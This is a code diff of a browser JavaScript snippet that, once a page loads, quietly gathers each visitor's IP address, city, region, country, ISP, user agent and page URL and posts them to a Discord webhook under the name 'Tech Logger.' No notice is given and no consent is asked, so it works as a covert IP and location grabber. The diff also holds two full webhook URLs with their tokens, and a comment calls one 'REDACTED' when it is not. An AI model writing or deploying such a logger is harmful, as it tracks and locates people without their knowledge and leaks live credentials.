@@ -1,29 +1,68 @@
+// Using ipapi.co to get IP alongside geolocation data
+const geoAPI = "https://ipapi.co/json/";
 
-const ipifyAPI = "https://api.ipify.org?format=json";
+// REDACTED: Replace this with your actual webhook URL. Keep it secret!
+const webhookURL = "https://discord.com/api/webhooks/1538788853186568244/EgwsZDszBdHjjHF1Wyo5z2yAnHOBZw_Q3qQPDZqqIXC3bbY8tua6rYOReAHcsrZ8M0Hp";
 
-
-const webhookURL = "https://discord.com/api/webhooks/1538331570295930983/YrXnoPHn6JFh1WfwcqFNqelBuYaD5FAa4OVFxXhgZc3vgSjyUj6IjaOuHSy1EvDhEADc";
-
-
-async function getIP() {
+async function getClientData() {
     try {
-        const response = await fetch(ipifyAPI);
+        const response = await fetch(geoAPI);
         const data = await response.json();
-        return data.ip;
+        
+        return {
+            ip: data.ip || "Unknown",
+            city: data.city || "Unknown",
+            region: data.region || "Unknown",
+            country: data.country_name || "Unknown",
+            isp: data.org || "Unknown",
+            // Grabs browser and OS info
+            userAgent: navigator.userAgent || "Unknown", 
+            // Grabs the page URL where the script is executed
+            url: window.location.href || "Unknown",
+            time: new Date().toISOString()
+        };
     } catch (error) {
-        console.error("Error fetching IP:", error);
+        console.error("Error fetching client data:", error);
         return null;
     }
 }
 
-async function sendToDiscord(ip) {
-    if (!ip) {
-        console.error("IP address is null or undefined.");
+async function sendToDiscord(info) {
+    if (!info) {
+        console.error("No client data available to send.");
         return;
     }
 
+    // Formatting the payload using Discord Embeds for a much neater UI
     const payload = {
-        content: `IP Address: ${ip}`
+        username: "Tech Logger", // You can change the bot's display name here
+        embeds: [
+            {
+                title: "New Connection Logged",
+                color: 3447003, // A sleek blue hex color (converted to decimal)
+                fields: [
+                    {
+                        name: "🌐 Network Info",
+                        value: `**IP:** ${info.ip}\n**ISP:** ${info.isp}`,
+                        inline: false
+                    },
+                    {
+                        name: "📍 Location",
+                        value: `${info.city}, ${info.region}, ${info.country}`,
+                        inline: false
+                    },
+                    {
+                        name: "💻 System Info",
+                        value: `**URL:** ${info.url}\n**User Agent:** \`${info.userAgent}\``,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "Tech Logging System"
+                },
+                timestamp: info.time
+            }
+        ]
     };
 
     try {
@@ -36,22 +75,20 @@ async function sendToDiscord(ip) {
         });
 
         if (response.ok) {
-            console.log("IP sent to Discord successfully!");
+            console.log("Data sent to Discord successfully!");
         } else {
-            console.error("Error sending IP to Discord:", response.statusText);
+            console.error("Error sending to Discord:", response.statusText);
         }
     } catch (error) {
         console.error("Error:", error);
     }
 }
 
-
 async function main() {
-    const ip = await getIP();
-    if (ip) {
-        await sendToDiscord(ip);
+    const info = await getClientData();
+    if (info) {
+        await sendToDiscord(info);
     }
 }
-
 
 main();
